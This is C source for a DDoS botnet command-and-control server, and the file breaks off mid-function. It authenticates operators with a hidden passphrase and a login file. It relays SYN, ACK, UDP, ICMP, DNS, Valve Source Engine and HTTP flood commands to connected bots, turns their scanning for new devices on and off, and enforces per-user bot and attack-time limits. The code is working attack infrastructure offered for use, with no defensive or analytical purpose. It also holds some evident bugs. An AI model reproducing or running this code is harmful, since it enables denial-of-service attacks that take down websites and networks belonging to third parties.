#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <glob.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/sysctl.h>

#define LOG_FORMAT      "(%s, %d, %s, %s, %s, %d, %s),\n"
#define USER_FORMAT     "\x1b[33m(\x1b[31m%s\x1b[33m, \x1b[31m%s\x1b[33m, \x1b[31m%s\x1b[33m, \x1b[31m%s\x1b[33m, \x1b[31m%s\x1b[33m),\n"
#define MAXFDS          1000000
#define EPOLL_TIMEOUT   -1
#define ATK_MAXRUNNING  1

#define USER_COMMANDS   5
#define ADMIN_COMMANDS  2

static volatile int epoll_fd = 0, attack_id = 0, listen_fd = 0, scanning = 1, attacking = 1, operatorCount = 0, last_attack = 0;
static uint32_t x, y, z, w;

struct clientdata_t
{
    int fd, arch_len, scanning;
    char connected, arch[32];
} clients[MAXFDS];

struct accountinfo_t
{
    char username[32], password[32], floods[128];
    int fd, admin, maxbots;
    int attacktime, cooldown;
};

char *user_commands[USER_COMMANDS][2] = {
    {"synflood", "SYN flood optimized for higher GBPS"},
    {"ackflood", "ACK flood optimized for higher GBPS"},
    {"udpflood", "UDP flood optimized for higher GBPS"},
    {"icmpflood", "ICMP flood optimized for bypassing"},
    {"dnsflood", "DNS flood optimized taking down websites"},
    {"vseflood", "Valve Source Engine"},    
    {"httpflood", "HTTP flood"},

    {"L4 Flags", "Size, Rand, Ttl, Port and Sport"},
    {"L7 Flags", "Conns, Domain, Port, Postdata, Path and Method"},
};

char *admin_commands[ADMIN_COMMANDS][2] = {
    {"\r\nattacks <enable/disable>", "enable or disable the use of attacks"},
    {"botcount <-s/-e> <find>", "view the statistics of the bots (arguments are optional)"},
};

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
	int total = 0, got = 1;

	while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
	{
		got = read(fd, buffer + total, 1);
		total++;
	}

	return got;
}

void trim(char *str)
{
	int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin]))
    	begin++;

    while ((end >= begin) && isspace(str[end]))
    	end--;

    for (i = begin; i <= end; i++)
    	str[i - begin] = str[i];

    str[i - begin] = '\0';
}

int fd_set_blocking(int fd, int blocking)
{
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags == -1)
        return 0;

    if (blocking)
        flags &= ~O_NONBLOCK;
    else
        flags |= O_NONBLOCK;

    return fcntl(fd, F_SETFL, flags) != -1;
}

int split(const char *txt, char delim, char ***tokens)
{
    int *tklen, *t, count = 1;
    char **arr, *p = (char *) txt;

    while (*p != '\0')
        if (*p++ == delim)
            count += 1;

    t = tklen = calloc (count, sizeof (int));
    for (p = (char *) txt; *p != '\0'; p++)
        *p == delim ? *t++ : (*t)++;

    *tokens = arr = malloc (count * sizeof (char *));
    t = tklen;
    p = *arr++ = calloc (*(t++) + 1, sizeof (char *));
    while (*txt != '\0')
    {
        if (*txt == delim)
        {
            p = *arr++ = calloc (*(t++) + 1, sizeof (char *));
            txt++;
        }
        else
            *p++ = *txt++;
    }

    free(tklen);
    return count;
}

char *read_line(int fd, char *buffer, int buffer_size)
{
    int p = 0, x = 0;

    memset(buffer, 0, buffer_size);
    while(1)
    {
        x = read(fd, buffer + p, 1);
        if (x < 0)
            break;
        if (buffer[p] == '\r' || buffer[p] == '\n')
            break;
        p++;
    }

    if (!x)
        return NULL;

    return buffer;
}

void clearnup_connection(struct clientdata_t *conn)
{
	if (conn->fd >= 1)
	{
		close(conn->fd);
		conn->fd = 0;
	}

	conn->connected = 0;
    conn->arch_len = 0;
    conn->scanning = 0;
    memset(conn->arch, 0, sizeof(conn->arch));
}

void terminate(void)
{
	int i;
	for (i = 0; i < MAXFDS; i++)
		clearnup_connection(&clients[i]);

	perror(NULL);
}

int broadcast_command(char *sendbuf, int maxcount, int maxtime, int myfd, char *floods, char *user, int admin_mode)
{
    if (attacking == 0)
    {
        write(myfd, "\x1b[96mAttacks are disabled by the Staff Team!\r\n", strlen("\x1b[96mAttacks are disabled by the Staff Team!\r\n"));
        return 0;
    }

    char tmpbuf[1024], snbuf[1024];
    strcpy(tmpbuf, sendbuf);

    int args_len, i, g_time, maxcnt = 0;
    char **arguments;

    if ((args_len = split(tmpbuf, ' ', &arguments)) <= 2)
    {
        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
        memset(tmpbuf, 0, sizeof(tmpbuf));
        write(myfd, "\x1b[96m!flood [IP] [TIME] [Arguments]\r\n", strlen("\x1b[96m!flood [IP] [TIME] [Arguments]\r\n"));
        return 0;
    }

    if (arguments[0][0] == '-')
    {
        int newmax = atoi(arguments[0] + 1);

        if ((newmax > maxcount || newmax < 1) && maxcount != -1)
        {
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            free(arguments);
            memset(tmpbuf, 0, sizeof(tmpbuf));
            write(myfd, "\x1b[96mYou can not use more bots than you have access to\r\n", strlen("\x1b[96mYou can not use more bots than you have access to\r\n"));
            return 0;
        }

        maxcnt = 1;
        maxcount = newmax;
        strcpy(snbuf, sendbuf + strlen(arguments[0]) + 1);
    }

    if (arguments[0 + maxcnt])
    {
        int args2_len, i, atk_found = 0;
        char **arguments2;

        if ((args2_len = split(floods, ',', &arguments2)) <= 0)
        {
            for (i = 0; i < args2_len; i++)
                free(arguments2[i]);

            free(arguments2);
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[96mUnknown error, please contact the Staff Team!\r\n", strlen("\x1b[96mUnknown error, please contact the Staff Team!\r\n"));
            return 0;
        }

        if (args2_len == 1 && strcmp(arguments2[0], "all") == 0)
        {
            atk_found = 1;
            goto skip;
        }

        if (args2_len == 1 && strcmp(arguments2[0], "none") == 0)
        {
            atk_found = 0;
            goto skip;
        }

        for (i = 0; i < args2_len; i++)
        {
            int x;

            if (atk_found == 1)
                break;

            for (x = 0; x < USER_COMMANDS; x++)
            {
                if (strcmp(user_commands[x][0], arguments2[i]) == 0 && strcmp(arguments[0 + maxcnt], arguments2[i]) == 0)
                {
                    atk_found = 1;
                    break;
                }
            }
        }

        skip:
        if (atk_found == 0)
        {
            for (i = 0; i < args2_len; i++)
                free(arguments2[i]);

            free(arguments2);
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[96mYour attack method is unknown\r\n", strlen("\x1b[96mYour attack method is unknown\r\n"));
            return 0;
        }

        for (i = 0; i < args2_len; i++)
            free(arguments2[i]);

        free(arguments2);
    }

    if (arguments[2 + maxcnt])
    {
        int atk_time = atoi(arguments[2 + maxcnt]);
        g_time = atk_time;
        if (atk_time > maxtime || atk_time > 500)
        {
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[96mYou must stick within your attack time limit\r\n", strlen("\x1b[96mYou must stick within your attack time limit\r\n"));
            return 0;
        }
    }

    memset(tmpbuf, 0, sizeof(tmpbuf));

    int n = 0, sentto = 0, fd = 0, err = 0;
    char rdbuf[1024];
    uint16_t len;
    struct sockaddr_in sockaddr = {0};

    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
        return 0;

    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = htons(56412);
    sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(fd, (struct sockaddr *)&sockaddr, sizeof (struct sockaddr_in)) == -1)
    {
        close(fd);
        write(myfd, "\x1b[96mThe API has failed to build your command\r\n", strlen("\x1b[96mThe API has failed to build your command\r\n"));
        return 0;
    }

    if (maxcnt == 1)
        send(fd, snbuf, strlen(snbuf), 0);
    else
        send(fd, sendbuf, strlen(sendbuf), 0);
    send(fd, "\n", 1, 0);

    n = recv(fd, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
    if (n == -1)
    {
        close(fd);
        write(myfd, "\x1b[96mThe API has failed to build your command\r\n", strlen("\x1b[96mThe API has failed to build your command\r\n"));
        return 0;
    }

    if (len == 0)
    {
        close(fd);
        write(myfd, "\x1b[96mThe API has failed to build your command\r\n", strlen("\x1b[96mThe API has failed to build your command\r\n"));
        return 0;
    }

    len = ntohs(len);
    if (len > sizeof (rdbuf))
    {
        close(fd);
        write(myfd, "\x1b[96mThe API has failed to build your command\r\n", strlen("\x1b[96mThe API has failed to build your command\r\n"));
        return 0;
    }

    n = recv(fd, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
    if (n == -1)
    {
        close(fd);
        write(myfd, "\x1b[96mThe API has failed to build your command\r\n", strlen("\x1b[96mThe API has failed to build your command\r\n"));
        return 0;
    }

    recv(fd, &len, sizeof (len), MSG_NOSIGNAL);
    len = ntohs(len);
    recv(fd, rdbuf, len, MSG_NOSIGNAL);

    for (i = 0; i < MAXFDS; i++)
	{
		if (clients[i].connected == 1 && (maxcount == -1 || sentto < maxcount))
        {
            send(clients[i].fd, rdbuf, len, MSG_NOSIGNAL);
            sentto++;
        }
	}

    char prompt[512];
    if (sentto == 410)
    {
        sprintf(prompt, "\x1b[96mCan not start attacks with less than 1 bot\r\n");
        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
        write(myfd, prompt, strlen(prompt));
        memset(prompt, 0,  sizeof(prompt));
        return 0;
    }
    else
    {
        time_t current_time;
        struct tm *local_time;
        current_time = time(NULL);
        local_time = localtime(&current_time);
        /*char ts[128];
        strcpy(ts, asctime(local_time));
        trim(ts); ts[strcspn(ts, "\n")] = 0;*/
        sprintf(prompt, "\x1b[96mcommand sent to %d clients\r\n", sentto);
    }

    FILE *log_file;
    char log_buf[256];
    time_t current_time;
    struct tm *local_time;
    current_time = time(NULL);
    local_time = localtime(&current_time);
    char ts[128];
    strcpy(ts, asctime(local_time));
    trim(ts); ts[strcspn(ts, "\n")] = 0;
    snprintf(log_buf, sizeof(log_buf), LOG_FORMAT, ts, attack_id, user, arguments[0], arguments[1], maxcount, arguments[2]);

    if ((log_file = fopen("logs.txt", "a")) == NULL)
    {
        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
    	write(myfd, prompt, strlen(prompt));
        memset(prompt, 0,  sizeof(prompt));
        return 1;
    }
	

    fputs(log_buf, log_file);
    fclose(log_file);
    attack_id++;

    for (i = 0; i < args_len; i++)
        free(arguments[i]);

    free(arguments);
	write(myfd, prompt, strlen(prompt));
    memset(prompt, 0,  sizeof(prompt));
    return g_time;
}

void *ping_pong(void *arg)
{
    int i = 0;

    while(1)
    {
        for (i = 0; i < MAXFDS; i++)
        {
            if (clients[i].connected == 1 && clients[i].fd >= 1)
                send(clients[i].fd, "\x33\x66\x99", 3, MSG_NOSIGNAL);
        }

        sleep(20);
    }
}

void scanner_enable(void)
{
    int i = 0;

	for (i = 0; i < MAXFDS; i++)
	{
		if (clients[i].connected == 1 && clients[i].scanning == 0 && clients[i].fd >= 1)
        {
            clients[i].scanning = 1;
            send(clients[i].fd, "\x66\x33\x99", 3, MSG_NOSIGNAL);
        }
	}
}

void scanner_disable(void)
{
    int i = 0;

	for (i = 0; i < MAXFDS; i++)
	{
        if (clients[i].connected == 1 && clients[i].scanning == 1 && clients[i].fd >= 1)
        {
            clients[i].scanning = 0;
            send(clients[i].fd, "\x33\x99\x66", 3, MSG_NOSIGNAL);
        }
	}
}


void *tab_title_admin(void *arg)
{
    int botcount = 0, i;
    char title[128];
    int myfd = *((int *)arg);

    while (1)
    {
        for (i = 0; i < MAXFDS; i++)
        {
            if (clients[i].connected == 1)
                botcount++;
            else
                continue;
        }

        sprintf(title, "\033]0;%d Bots | %d Users\007", botcount, operatorCount);

        if (send(myfd, title, strlen(title), MSG_NOSIGNAL) <= 0)
        {
            memset(title, 0, sizeof(title));
            break;
        }

        botcount = 0;
        memset(title, 0, sizeof(title));
        sleep(2);
    }

    pthread_exit(0);
}

void *tab_title_user_offset(void *arg)
{
    int botcount = 0, i;
    char title[128];
    int myfd = *((int *)arg);

    while (1)
    {
        for (i = 0; i < MAXFDS; i++)
        {
            if (clients[i].connected == 1)
                botcount++;
            else
                continue;
        }

        sprintf(title, "\033]0;%d Bots\007", botcount);

        if (send(myfd, title, strlen(title), MSG_NOSIGNAL) <= 0)
        {
            memset(title, 0, sizeof(title));
            break;
        }

        botcount = 0;
        memset(title, 0, sizeof(title));
        sleep(2);
    }

    pthread_exit(0);
}

void *tab_title_user(void *arg)
{
    int botcount = 0, i;
    char title[128];
    int myfd = *((int *)arg);

    while (1)
    {
        for (i = 0; i < MAXFDS; i++)
        {
            if (clients[i].connected == 1)
                botcount++;
            else
                continue;
        }

        sprintf(title, "\033]0;%d Bots\007", botcount);

        if (send(myfd, title, strlen(title), MSG_NOSIGNAL) <= 0)
        {
            memset(title, 0, sizeof(title));
            break;
        }

        botcount = 0;
        memset(title, 0, sizeof(title));
        sleep(2);
    }

    pthread_exit(0);
}

void *tab_title_user2(void *arg)
{
    int botcount = 0, i;
    char title[128];
    int myfd = *((int *)arg);

    while (1)
    {
        for (i = 0; i < MAXFDS; i++)
        {
            if (clients[i].connected == 1)
                botcount++;
            else
                continue;
        }

        sprintf(title, "\033]0;%d Bots\007", botcount);

        if (send(myfd, title, strlen(title), MSG_NOSIGNAL) <= 0)
        {
            memset(title, 0, sizeof(title));
            break;
        }

        botcount = 0;
        memset(title, 0, sizeof(title));
        sleep(2);
    }

    pthread_exit(0);
}

int create_and_bind(char *port)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;

	memset(&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);

    if (s != 0)
		return -1;

	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1)
			continue;

		int yes = 1;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
        {
            terminate();
        }

		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0)
			break;

		close(sfd);
	}

	if (rp == NULL)
		return -1;
	else
	{
		freeaddrinfo(result);
		return sfd;
	}
}

void *bot_event(void *arg)
{
	struct epoll_event event;
	struct epoll_event *events;

    events = calloc(MAXFDS, sizeof event);

    while (1)
    {
		int n, i;
		n = epoll_wait(epoll_fd, events, MAXFDS, EPOLL_TIMEOUT);

		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clearnup_connection(&clients[events[i].data.fd]);
				continue;
			}
			else if (listen_fd == events[i].data.fd)
			{
               	while (1)
               	{
               		int accept_fd, s;
					struct sockaddr in_addr;
	                socklen_t in_len = sizeof(in_addr);

					if ((accept_fd = accept(listen_fd, &in_addr, &in_len)) == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK))
							break;
                    	else
                        {
                            terminate();
                        }
					}

					if ((s = fd_set_blocking(accept_fd, 0)) == -1)
					{
						close(accept_fd);
						break;
					}

					event.data.fd = accept_fd;
					event.events =  EPOLLIN | EPOLLET;

					if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, accept_fd, &event)) == -1)
					{
						terminate();
						break;
					}

					clients[event.data.fd].connected = 1;
                    clients[event.data.fd].scanning = 0;
					clients[event.data.fd].fd = event.data.fd;
                    send(clients[event.data.fd].fd, "\x33\x66\x99", 3, MSG_NOSIGNAL);
				}
				continue;
			}
            else
			{
				int end = 0, fd = events[i].data.fd;

				while (1)
				{
					char buf[32];
					int count;

					while ((count = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL)) > 0)
					{
                        char *buf_ptr = buf;

                        if (*buf_ptr++ == '\x33' &&  *buf_ptr++ == '\x66' && *buf_ptr++ == '\x99')
                        {
                            clients[events[i].data.fd].arch_len = *(uint8_t *)buf_ptr;
                            buf_ptr += sizeof(uint8_t);
                            memcpy(clients[events[i].data.fd].arch, buf_ptr, clients[events[i].data.fd].arch_len);
                        }
                    }

                    memset(buf, 0, sizeof(buf));

					if (count == -1)
					{
						if (errno != EAGAIN)
                            clearnup_connection(&clients[events[i].data.fd]);

						break;
					}
					else if (count == 0)
					{
                        clearnup_connection(&clients[events[i].data.fd]);
						break;
					}
				}
			}
		}
	}
}

void userlist(int myfd)
{
    char rdbuf[512];
    int file_fd;

    if ((file_fd = open("logins.txt", O_RDONLY)) == -1)
    {
        write(myfd, "\x1b[96mFailed to open logins.txt\r\n", strlen("\x1b[96mFailed to open logins.txt\r\n"));
        return;
    }

    while (memset(rdbuf, 0, sizeof(rdbuf)) && read_line(file_fd, rdbuf, sizeof(rdbuf)) != NULL)
    {
        int args_len, i;
        char **arguments;

        if (rdbuf[0] == '\r' || rdbuf[0] == '\n')
            break;

        if ((args_len = split(rdbuf, ' ', &arguments)) != 7)
        {
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            free(arguments);
            continue;
        }

        char send_buf[256];
        snprintf(send_buf, sizeof(send_buf), USER_FORMAT, arguments[0], arguments[2], arguments[3], arguments[4], arguments[5]);
        write(myfd, send_buf, strlen(send_buf));
        memset(send_buf, 0, sizeof(send_buf));

        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
    }
}

void botcount(int myfd, int dofind, char *findstr)
{
    struct bot_entry_t {
        int count;
        char arch[32];
    } bot_entry[30];

    int i = 0, q = 0, x = 0, first = 1;

    for (i = 0; i < 30; i++)
    {
        bot_entry[i].count = 0;
        memset(bot_entry[i].arch, 0, sizeof(bot_entry[i].arch));
    }

    for (i = 0; i < MAXFDS; i++)
    {
        if (clients[i].arch_len >= 1 && clients[i].connected == 1)
        {
            if (first == 1)
            {
                strcpy(bot_entry[q].arch, clients[i].arch);
                bot_entry[q].count++;
                first = 0;
                q++;
                continue;
            }
            else
            {
                int found = 0;

                for (x = 0; x < q; x++)
                {
                    if (strcmp(bot_entry[x].arch, clients[i].arch) == 0)
                    {
                        found = 1;
                        bot_entry[x].count++;
                        break;
                    }
                }

                if (found == 0)
                {
                    strcpy(bot_entry[q].arch, clients[i].arch);
                    bot_entry[q].count++;
                    q++;
                    continue;
                }
            }
        }
    }

    for (i = 0; i < q; i++)
    {
        char sndbuf[128];
        if (dofind == 1)
        {
            if (strstr(bot_entry[i].arch, findstr) != NULL)
            {
                sprintf(sndbuf, "\x1b[96m%s\x1b[97m: %d\r\n", bot_entry[i].arch, bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
        }
        else if (dofind == 2)
        {
            if (strcmp(bot_entry[i].arch, findstr) == 0)
            {
                sprintf(sndbuf, "\x1b[96m%s\x1b[97m: %d\r\n", bot_entry[i].arch, bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
        }
        else
        {
            if (strcmp(bot_entry[i].arch, "h") == 0)
            {
                sprintf(sndbuf, "\x1b[96munknown\x1b[97m: %d\r\n", bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
            else
            {
                sprintf(sndbuf, "\x1b[96m%s\x1b[97m: %d\r\n", bot_entry[i].arch, bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
        }
    }
    memset(bot_entry, 0, sizeof(bot_entry));
}

int valid_user(char *user, int myfd)
{
    int file_fd, first = 1;
    char total_buf[8096];
    char tmp_buf[8096];

    if ((file_fd = open("logins.txt", O_RDONLY)) == -1)
    {
        write(myfd, "\x1b[96mYour account has been deleated, please contact the admin.\r\n", strlen("\x1b[96mYour account has been deleated, please contact the admin.\r\n"));
        return 0;
    }

    while (memset(tmp_buf, 0, sizeof(tmp_buf)) && read(file_fd, tmp_buf, sizeof(tmp_buf)) > 0)
    {
        if (first == 1)
        {
            first = 0;
            strcpy(total_buf, tmp_buf);
        }
        else
            strcat(total_buf, tmp_buf);
    }

    if (strstr(total_buf, user) == NULL)
    {
        write(myfd, "\x1b[96mYour account has been deleated, please contact the admin.\r\n", strlen("\x1b[96mYour account has been deleated, please contact the admin.\r\n"));
        memset(tmp_buf, 0, sizeof(tmp_buf));
        memset(total_buf, 0, sizeof(total_buf));
        return 0;
    }

    memset(tmp_buf, 0, sizeof(tmp_buf));
    memset(total_buf, 0, sizeof(total_buf));
    return 1;
}

void get_captcha(char *s, const int len)
{
    static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    int i = 0;
    for (i = 0; i < len; i++)
        s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

    s[len] = 0;
}

void *controller_thread(void *arg)
{
    struct accountinfo_t accinfo;
	char rdbuf[512], username[32], password[32], hidden[32], prompt[256];
	int logged_in = 0, file_fd;
	pthread_t thread;

    accinfo.fd = *((int *)arg);
    read(accinfo.fd, hidden, sizeof(hidden));
    trim(hidden); hidden[strcspn(hidden, "\n")] = 0;

    if (strcmp(hidden, "hraztalag") != 0)
    {
        close(accinfo.fd);
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        memset(hidden, 0, sizeof(hidden));
        pthread_exit(0);
    }

    write(accinfo.fd, "\033[?1049h", strlen("\033[?1049h"));
    write(accinfo.fd, "\x1b[92mUsername:\x1b[97m ", strlen("\x1b[92mUsername:\x1b[97m "));
    read(accinfo.fd, username, sizeof(username));
    write(accinfo.fd, "\x1b[92mPassword:\x1b[97m ", strlen("\x1b[92mPassword:\x1b[97m "));
    read(accinfo.fd, password, sizeof(password));

    if (strlen(username) <= 3 || strlen(password) <= 3)
    {
        close(accinfo.fd);
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        memset(hidden, 0, sizeof(hidden));
        pthread_exit(0);
    }

    trim(username); username[strcspn(username, "\n")] = 0;
    trim(password); password[strcspn(password, "\n")] = 0;

	if ((file_fd = open("logins.txt", O_RDONLY)) == -1)
	{
		close(accinfo.fd);
		memset(username, 0, sizeof(username));
		memset(password, 0, sizeof(password));
		memset(hidden, 0, sizeof(hidden));
		pthread_exit(0);
	}

	while (memset(rdbuf, 0, sizeof(rdbuf)) && read_line(file_fd, rdbuf, sizeof(rdbuf)) != NULL)
	{
    		int args_len, i;
    		char **arguments;

    		if (rdbuf[0] == '\r' || rdbuf[0] == '\n')
    		    break;

    		if ((args_len = split(rdbuf, ' ', &arguments)) != 7)
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);

    		    free(arguments);
    		    continue;
    		}

    		// verify all arguments
    		strcpy(accinfo.username, arguments[0]);
    		strcpy(accinfo.password, arguments[1]);
    		accinfo.maxbots = atoi(arguments[2]);
    		accinfo.attacktime = atoi(arguments[3]);
    		accinfo.cooldown = atoi(arguments[4]);
    		strcpy(accinfo.floods, arguments[5]);
    		accinfo.admin = atoi(arguments[6]);

    		if (strlen(accinfo.username) < 1 || strcmp(username, accinfo.username) != 0)
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);

    		    free(arguments);
    		    continue;
    		}
    		if (strlen(accinfo.password) < 1 || strcmp(password, accinfo.password) != 0)
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);

    		    free(arguments);
    		    continue;
    		}
    		if (accinfo.maxbots != -1 && (accinfo.maxbots <= 0 && accinfo.maxbots != -1))
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);

    		    free(arguments);
    		    continue;
    		}
    		if (accinfo.attacktime < 1 || accinfo.attacktime > 500)
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);

    		    free(arguments);
    		    continue;
    		}
    		if (accinfo.cooldown < 1 || accinfo.cooldown > 500)
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);

    		    free(arguments);
    		    continue;
    		}
    		if (accinfo.admin != 1 && accinfo.admin != 0)
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);

    		    free(arguments);
    		    continue;
    		}

    		for (i = 0; i < args_len; i++)
    		    free(arguments[i]);

    		free(arguments);
    		logged_in = 1;
    	    close(file_fd);
            break;
    }

    if (logged_in != 1)
    {
    	close(accinfo.fd);
		memset(username, 0, sizeof(username));
		memset(password, 0, sizeof(password));
        memset(hidden, 0, sizeof(hidden));
		pthread_exit(0);
    }


    write(accinfo.fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h") + 16);

       if (accinfo.admin == 1)
            sprintf(prompt, "\x1b[92mWelcome \x1b[97m%s \x1b[92mYou are now logged in with \x1b[97madmin \x1b[92mprivileges.\r\n\r\n", username);
        else
            sprintf(prompt, "\x1b[92mWelcome \x1b[97m%s \x1b[92mYou are now logged in with \x1b[97muser \x1b[92mprivileges.\r\n\r\n", username);

        write(accinfo.fd, prompt, strlen(prompt));
        memset(prompt, 0, sizeof(prompt));

       if (accinfo.admin == 1)
            sprintf(prompt, "\x1b[92m%s@botnet:-|admin$\033[0m ", username);
        else
            sprintf(prompt, "\x1b[92m%s@botnet:-|user$\033[0m ", username);
        write(accinfo.fd, prompt, strlen(prompt));




        if (accinfo.admin == 1)
            pthread_create(&thread, NULL, &tab_title_admin, &accinfo.fd);
        else
            pthread_create(&thread, NULL, &tab_title_user, &accinfo.fd);


    operatorCount++;
    int spam_detect = 0, last_spam = time(NULL) - 3;

	while (memset(rdbuf, 0, sizeof(rdbuf)) && read(accinfo.fd, rdbuf, sizeof(rdbuf)) > 0 && valid_user(accinfo.username, accinfo.fd) == 1)
	{
		trim(rdbuf);

		if (strlen(rdbuf) == 0)
		{
            if (last_spam + 2 > time(NULL))
                    spam_detect++;
                else
                {
                    spam_detect = 0;

                    if (spam_detect >= 5)
                    {
                        write(accinfo.fd, "\x1b[96mYou have been detected spamming, verify the captcha to contiune\r\n", strlen("\x1b[96mYou have been detected spamming, verify the captcha to contiune\r\n"));
                        while (1)
                        {
                            char captcha[6], code[32];

                            get_captcha(captcha, 6);
                            write(accinfo.fd, "\x1b[97m", strlen("\x1b[97m"));
                            write(accinfo.fd, captcha, strlen(captcha));
                            write(accinfo.fd, "\r\n\x1b[97mCaptcha Code: ", strlen("\r\n\x1b[97mCaptcha Code: "));
                            read(accinfo.fd, code, sizeof(code));
                            trim(code); code[strcspn(code, "\n")] = 0;

                            if (strcmp(captcha, code) != 0)
                            {
                                write(accinfo.fd, "\x1b[96mInvalid code please try again\r\n", strlen("\x1b[96mInvalid code please try again\r\n"));
                                sleep(1);
                                continue;
                            }

                            spam_detect = 0;
                            memset(captcha, 0, sizeof(captcha));
                            memset(code, 0, sizeof(code));
                            break;
                        }
                    }
                }

			write(accinfo.fd, prompt, strlen(prompt));
			memset(rdbuf, 0, sizeof(rdbuf));
            last_spam = time(NULL);
			continue;
		}

        spam_detect = 0;

		if (strcmp(rdbuf, "help") == 0 || strcmp(rdbuf, "?") == 0)
		{
            if (strcmp(accinfo.floods, "all") == 0)
            {
                int i = 0;

                for (i = 0; i < USER_COMMANDS; i++)
                {
                    char atk_help[128];
                        sprintf(atk_help, "\x1b[96m%s:\x1b[97m %s\r\n", user_commands[i][0], user_commands[i][1]);
                    write(accinfo.fd, atk_help, strlen(atk_help));
                    memset(atk_help, 0, sizeof(atk_help));
                }
            }
            else
            {
                int args2_len, i, atk_count = 0;
                char **arguments2;

                if ((args2_len = split(accinfo.floods, ',', &arguments2)) <= 0)
                {
                    for (i = 0; i < args2_len; i++)
                        free(arguments2[i]);

                    free(arguments2);
                    write(accinfo.fd, "\x1b[96mUnknown error, please contact the Staff Team!\r\n", strlen("\x1b[96mUnknown error, please contact the admin\r\n"));
                }

                for (i = 0; i < args2_len; i++)
                {
                    int x;
                    for (x = 0; x < USER_COMMANDS; x++)
                    {
                        if (strcmp(user_commands[x][0], arguments2[i]) == 0)
                        {
                            char atk_help[128];
                                sprintf(atk_help, "\x1b[96m%s:\x1b[97m %s\r\n", user_commands[i][0], user_commands[i][1]);
                            write(accinfo.fd, atk_help, strlen(atk_help));
                            memset(atk_help, 0, sizeof(atk_help));
                            atk_count++;
                        }
                    }
                }

                if (atk_count == 0)
                    write(accinfo.fd, "\x1b[96mYou dont have access to any floods\r\n", strlen("\x1b[96mYou dont have access to any floods\r\n"));

                for (i = 0; i < args2_len; i++)
                    free(arguments2[i]);

                free(arguments2);

            }

            if (accinfo.admin == 1)
            {
                int i = 0;

                for (i = 0; i < ADMIN_COMMANDS; i++)
                {
                    char adm_help[128];
                        sprintf(adm_help, "\x1b[96m%s:\x1b[97m %s\r\n", admin_commands[i][0], admin_commands[i][1]);
                    write(accinfo.fd, adm_help, strlen(adm_help));
                    memset(adm_help, 0, sizeof(adm_help));
                }
            }
		}

        else if (strcmp(rdbuf, "clear") == 0)
		{
            write(accinfo.fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h") + 16);
        }
        else if (strcmp(rdbuf, "attacks enable") == 0 && accinfo.admin == 1)
		{
            write(accinfo.fd, "\x1b[96mAttacks have been enabled\r\n", strlen("\x1b[96mAttacks have been enabled\r\n"));
            attacking = 1;
        }
        else if (strcmp(rdbuf, "attacks disable") == 0 && accinfo.admin == 1)
		{
